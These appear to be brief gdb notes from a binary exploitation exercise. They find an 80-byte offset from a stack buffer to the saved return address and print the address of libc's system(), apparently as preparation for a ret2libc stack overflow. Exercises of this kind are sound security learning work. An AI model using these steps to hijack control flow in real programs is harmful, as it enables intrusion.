b *main + 169
run
dat_will
AAAAAAAA
i f
Stack level 0, frame at 0xffffd720:
 eip = 0x8048579 in main; saved eip 0xf7e45513
 Arglist at 0xffffd718, args: 
 Locals at 0xffffd718, Previous frame's sp is 0xffffd720
 Saved registers:
  ebx at 0xffffd710, ebp at 0xffffd718, edi at 0xffffd714, eip at 0xffffd71c
(gdb) i r
eax            0xffffd6cc       -10548

0xffffd71c - 0xffffd6cc => 0x50 => 80
offset buffer/EIP 80 oct

system:
p system
$1 = {text variable, no debug info} 0xf7e6aed0 system